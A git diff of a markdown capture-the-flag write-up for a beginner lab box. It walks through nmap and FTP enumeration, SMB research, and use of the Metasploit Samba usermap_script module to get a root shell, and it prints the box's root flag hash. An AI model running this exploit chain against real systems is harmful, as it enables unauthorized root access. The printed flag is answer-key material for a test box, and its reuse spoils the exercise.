@@ -13,7 +13,7 @@ This is a beginer box that I owned all you need to do is know how to use metaexp
 #### Step 1 - Enumeration
 -----
 I started with a full port scan 
-
+```bat
     start off with full port scan
     nmap -Pn -p - -oN fullport 10.10.10.3
     Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 09:09 EDT
@@ -59,10 +59,10 @@ I started with a full port scan
 
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 11.81 seconds
-
+```
 I have found a number of ports open, of course I started with port 21 hoping I could send files there but I could not find anything of value there or I could now exploit it myself. 
 
-
+```bat
     kali@kali:~$ ftp 10.10.10.3
     Connected to 10.10.10.3.
     220 (vsFTPd 2.3.4)
@@ -81,7 +81,7 @@ I have found a number of ports open, of course I started with port 21 hoping I c
     drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
     226 Directory send OK.
     ftp> 
-
+```
 
 
 
@@ -90,7 +90,7 @@ Next i took the time to learn what samba was.
 
 
 
-
+```bat
     What is NetBIOS SSN?
     Description. This indicates an attempt to use the NetBIOS-SSN protocol. NetBIOS Session Service (NBSS) is a protocol to connect two computers to transmit heavy data traffic. It is mostly used for printer and file services over a network
 
@@ -101,11 +101,12 @@ Next i took the time to learn what samba was.
 
     Port 139: SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network.
     Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet.
+```
 ----
 ### Step 2 -Exploitation
 ---
 After looking for something to use to exploit samba I started looking on searchsploit.
-
+```bat
     kali:~$ smbclient -help
     Usage: smbclient [-?EgqBVNkPeC] [-?|--help] [--usage] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-M|--message=HOST]
             [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-m|--max-protocol=LEVEL] [-T|--tar=<c|x>IXFvgbNan]
@@ -143,14 +144,14 @@ After looking for something to use to exploit samba I started looking on searchs
             ---------            -------
             WORKGROUP            LAME
 
-
+```
 Sadly i did not find what I was looking for but I also tried metasploit just be sure 
 
 ----
 ### Step 3 - Foothold
 ---
 
-
+```bat
     Matching Modules
     ================
 
@@ -191,7 +192,7 @@ Sadly i did not find what I was looking for but I also tried metasploit just be 
     31  exploit/windows/lpd/wincomlpd_admin                    2008-02-04       good       No     WinComLPD Buffer Overflow
     32  exploit/windows/smb/group_policy_startup               2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
     33  post/linux/gather/enum_configs                                          normal     No     Linux Gather Configurations
-
+```
 
 After looking through a lot of the exploits I started thinking methodically about it and looked athe the exploit description to see what I want. And I started to look for all the command execution scripts. There were 3 of them but luckly one of them worked the one that is highlighted. 
 
@@ -200,7 +201,7 @@ After looking through a lot of the exploits I started thinking methodically abou
 ---
 
 After using metasploit to select the correct exploit I was able to easily get root.
-
+```bat
     msf5 exploit(multi/samba/usermap_script) > options 
 
     Module options (exploit/multi/samba/usermap_script):
@@ -244,8 +245,8 @@ After using metasploit to select the correct exploit I was able to easily get ro
     root
     pwd
     /
-
-
+```
+```bat
     cd ..
     cd home
     ls
@@ -268,3 +269,4 @@ After using metasploit to select the correct exploit I was able to easily get ro
     vnc.log
     cat root.txt
     92caac3be140ef409e45721348a4e9df
+    ```
